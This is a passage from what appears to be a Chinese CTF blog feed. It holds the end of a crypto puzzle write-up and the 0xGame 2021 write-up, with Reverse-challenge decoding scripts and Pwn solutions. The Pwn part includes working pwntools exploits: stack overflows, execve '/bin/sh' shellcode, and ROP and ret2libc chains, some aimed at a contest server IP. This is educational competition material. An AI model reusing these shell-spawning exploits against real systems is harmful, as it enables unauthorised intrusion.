class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>keys<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> mingwen    mingwen<span class="token operator">=</span>enc    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        mingwen<span class="token operator">=</span>mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span>mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二层：下一步就是将二进制转换成ASCII：  </p><p>第三层：发现是base64，再解密：发现是一段奇怪的密文，此时附件中的py文件中有提示是加密的源码，分析发现是第四和第五层的加密方式，第四层这里我们可以发现，这里是采用一个偏移量为5并且依次后移一位的加密，这里只要将减换成加即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'n]h\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP'</span>temp<span class="token operator">=</span><span class="token string">''</span>offset<span class="token operator">=</span><span class="token number">5</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 得到解密后结果： Scodfuvmhityhirfuxfuvziiruvigzkyhv 而后再是第五层：这里采用了仿射密码，根据加密方式写一下解密脚本即可 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">string <span class="token operator">=</span> <span class="token string">'scodfuvmhityhirfuxfuvziiruvigzkyhv'</span>b<span class="token operator">=</span><span class="token number">7</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> string<span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 最终得到flag： 加上格式即可：<code>BJD&#123;bjdcongratulationsongettingtheflag&#125; </code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame 2021 WriteUp</title>
      <link href="/2021/10/11/0xGame%202021%20WriteUp/"/>
      <url>/2021/10/11/0xGame%202021%20WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="0xGame-2021-WriteUp"><a href="#0xGame-2021-WriteUp" class="headerlink" title="0xGame 2021 WriteUp"></a>0xGame 2021 WriteUp</h1><p>[toc]</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Pwn？！"><a href="#Pwn？！" class="headerlink" title="Pwn？！"></a>Pwn？！</h3><p>附件给的其实有点多余，我给的目的是让大家知道pwn的最终目的就是执行system(“/bin/sh”)</p><p>直接nc连接上之后cat flag打开flag文件即可</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>我已经给了后门函数地址在0x40115b</p><p>有一个明显的栈溢出</p><p>ida里面显示距离rbp-0x50</p><p>那么就直接覆盖0x50个字节填充以及0x8个字节覆盖rbp即可劫持到ret地址</p><p>直接覆盖成后门函数即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'121.4.15.155'</span><span class="token punctuation">,</span><span class="token number">10003</span><span class="token punctuation">)</span><span class="token comment">#r=process('./main')</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40115b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WTF？Shellcode！"><a href="#WTF？Shellcode！" class="headerlink" title="WTF？Shellcode！"></a>WTF？Shellcode！</h3><p>这个题其实就是想让大家了解什么是shellcode</p><p>也就是直接执行机器码</p><p>通过上网查找或者让pwntools自己生成的方法找到一段shellcode即可</p><p>注意shellcode的编写需要熟练的汇编理解，而且日后会经常写一些复杂的shellcode</p><p>注意到执行的是buf+0x20而不是buf本身</p><p>所以填充0x20个字节再放置shellcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>shellcode<span class="token operator">=</span><span class="token string">"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="No-BackDoor"><a href="#No-BackDoor" class="headerlink" title="No BackDoor!"></a>No BackDoor!</h3><p>这题需要了解linux下寄存器传递参数的顺序</p><p>rdi rsi rdx rcx r8 r9 栈</p><p>既然存在system函数，而且查找存在/bin/sh字符串</p><p>直接控制rdi位/bin/sh字符串地址，在调用system函数</p><p>就相当于执行了system(“/bin/sh”)</p><p>而控制rdi用的是pop rdi ; ret ;</p><p>这样直接把字符串地址布置在栈上</p><p>通过pop即控制了rdi参数</p><p>(注意到这里有点小问题，就是直接执行会报错，详情可以参考<a href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p><p>需要ret一次来调整栈帧)(当然也可以直接当下一题做)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>pop_rdi<span class="token operator">=</span><span class="token number">0x401223</span>bin_sh<span class="token operator">=</span><span class="token number">0x404040</span>system<span class="token operator">=</span><span class="token number">0x401040</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ret2libc-pro-max"><a href="#ret2libc-pro-max" class="headerlink" title="ret2libc pro max"></a>ret2libc pro max</h3><p>模板题，ctfwiki上讲的非常详细</p><p>建议遇上相似题目直接套模板</p><p>libc版本为2.23-ubuntu11.2_amd64</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'121.4.15.155'</span><span class="token punctuation">,</span><span class="token number">10004</span><span class="token punctuation">)</span><span class="token comment">#r=process('./main')</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>pop_rdi<span class="token operator">=</span><span class="token number">0x401223</span>puts_plt<span class="token operator">=</span><span class="token number">0x401030</span>puts_got<span class="token operator">=</span><span class="token number">0x404018</span>start<span class="token operator">=</span><span class="token number">0x401060</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x18ce17</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Signin-User-Friendly"><a href="#Signin-User-Friendly" class="headerlink" title="Signin: User Friendly"></a>Signin: User Friendly</h3><p>IDA 打开软件 直接按 <code>f5</code> 或者 <code>shift</code> + <code>f12</code> 查看字符串，即可看到flag</p><p>有人可能会想知道，每次生成的随机数是多少。实际上我也不知道。因为每次程序运行使用的随机种子都不同，所以生成的随机数也不同。如果想知道生成的随机数是多少，可以自行动态调试获知，再输入程序获取flag</p><h3 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h3><p><a href="https://github.com/upx/upx" title="UPX链接">UPX github链接</a></p><p>脱壳命令 <code>upx -d test.exe</code></p><p>这里还需要知道一下 <code>(a&amp;~b | b&amp;~a) == a ^ b</code> 这两个运算相等</p><p>解题脚本</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [161, 15, 188, 111, 218, 169, 159, 94, 41, 246, 197, 228, 110, 242, 177, 56, 27, 1, 17, 256, 256, 50, 233, 65, 104, 2, 4, 6, 42, 112, 55, 107, 48, 93, 130, 232, 37, 87, 242, 130]enc &#x3D; [145, 119, 251, 14, 183, 204, 228, 56, 17, 148, 253,133, 92, 145, 132, 92, 125, 103, 39, 308, 309, 10, 216, 35, 13, 48, 101, 62, 19, 69, 84, 82, 81, 62, 176, 217, 19, 51, 195, 255]for i in range(0,40):    print(chr(arr[i] ^ enc[i]), end &#x3D; &quot;&quot;)# 0xGame&#123;f8b8a2c5dff64581be2a895c9ac216d1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Our-Compilation-Story"><a href="#Our-Compilation-Story" class="headerlink" title="Our Compilation Story"></a>Our Compilation Story</h3><p>简单 python 代码，读懂就可以做</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [21,44,45,104,31,30,26,121,65,125,23,112,77,46,47,126,89,112,7,109,7,88,10,105,104,59,54,91,83,98,32,54,15,65,113,119,113]arr &#x3D; arr[::-1]for i in range(0,len(arr) - 3):    print(chr(arr[i] ^ arr[i + 3]), end &#x3D; &quot;&quot;)# 0xGame&#123;Th3_10ng_w4y_w3_901ng_fr33&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Random-Chaos"><a href="#Random-Chaos" class="headerlink" title="Random Chaos"></a>Random Chaos</h3><p>C语言 <code>rand</code> 函数生成的随机数是伪随机数，本质是一个线性同余发生器，在随机种子给定的情况下每次生成的随机数序列相同，所以直接异或就可以</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;unsigned char enc[41] &#x3D; &#123;0x22, 0xca, 0x7, 0x19, 0xf8, 0xfb, 0x28, 0x9d, 0x1e, 0x80, 0xac, 0xc9, 0x60, 0x46, 0x18, 0x21, 0xdf, 0x95, 0xd5, 0x70, 0xc5, 0x19, 0xea, 0xb0, 0x9c, 0x83, 0x11, 0x4a, 0x93, 0xc7, 0x91, 0xf6, 0x14, 0x71, 0x2f, 0x22, 0x14, 0xbf, 0x58, 0x76&#125;; int main()&#123;    srand(0x2021);    for (int i &#x3D; 0; i &lt; 40; ++i)    &#123;        printf(&quot;%c&quot;,(enc[i] ^ (rand() &amp; 0xff)));    &#125;    return 0;&#125;&#x2F;&#x2F; 0xGame&#123;d6ca93397ecb4d4e83792a7100737932&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Neverland"><a href="#Neverland" class="headerlink" title="Neverland"></a>Neverland</h3><p>递归深度比较小的时候，递归求解还能出结果</p><p>当递归深度非常大时候，时间不够求解出结果，所以flag只能输出一半</p><p>可以看一下文章按照优化斐波那契数列的方法优化一下func函数(<em>比如将递归转换为一个循环函数进行计算，虽然也慢，但与递归相比是非常的快了</em>)，就能输出正确结果</p><p><a href="https://blog.csdn.net/qq_41035588/article/details/81814547," title="斐波那契数列优化">【C语言】斐波那契数列四种优化求解</a></p><p><strong>当然不看以上方法也可以</strong>，我们知道 <code>int</code> 型数据储存数据有范围限制，而且可以知道这个数列在不断增大，所以 <code>func</code> 函数每次返回的数据，相当于数列中对应数据的值对 0x10000000 取模</p><p>斐波那契数列对某一个数取模会出现循环节，这个数列也同样如此，我们将<code>func</code>函数写一遍，按顺序输出一些数就可以发现规律了</p><p>测试代码如下</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def func(n):    if (n &#x3D;&#x3D; 0):        return 7    if (n &#x3D;&#x3D; 1):        return 8    return (3 * func(n-1) + 4 * func(n-2)) &amp; 0xfffffffffor i in range(1,50):    print(i,&quot;:&quot;,func(i))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果如下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">0 : 71 : 82 : 523 : 1884 : 7725 : 30686 : 122927 : 491488 : 1966129 : 78642810 : 314573211 : 1258290812 : 5033165213 : 20132658814 : 80530637215 : 322122546816 : 417 : 429496729218 : 419 : 429496729220 : 421 : 429496729222 : 423 : 429496729224 : 425 : 429496729226 : 427 : 429496729228 : 429 : 429496729230 : 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很容易就发现循环节了把，所以接下来就是直接异或操作就行，代码比较简单，这里就不写了</p><p>甚至我们可以求出这个数列的通项公式，也很容易得到这个数列的每一个数据对应的值，下面给出一个知乎链接讲述形如斐波那契数列的数列如何求通项公式</p><p><a href="https://www.zhihu.com/question/25217301" title="斐波那契通项公式">斐波那契数列通项公式是怎样推导出来的？-知乎</a></p><p>通项公式为 <code>a(n) = 3 * 4 ** n + 4 * (-1) ** n</code></p><h3 id="Roundabout"><a href="#Roundabout" class="headerlink" title="Roundabout"></a>Roundabout</h3><p>脱壳后，简单的利用 key 来循环异或，代码如下</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [68, 16, 46, 18, 50, 12, 8, 61, 86, 10, 16, 103, 0, 65, 0, 1, 70, 90, 68, 66, 110, 12, 68, 114, 12, 13, 64, 62, 75, 95, 2, 1, 76, 94, 91, 23, 110, 12, 22, 104, 91, 18]h &#x3D; &quot;this_is_not_flag\x00&quot;flag &#x3D; &quot;&quot;for i in range(0, 42):    flag +&#x3D; chr(ord(h[i % 16]) ^ arr[i])print(flag)# 0xGame&#123;b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Zero-Three"><a href="#Zero-Three" class="headerlink" title="Zero Three"></a>Zero Three</h3><p>z3 使用一下，就能解出flag</p><pre class="line-numbers 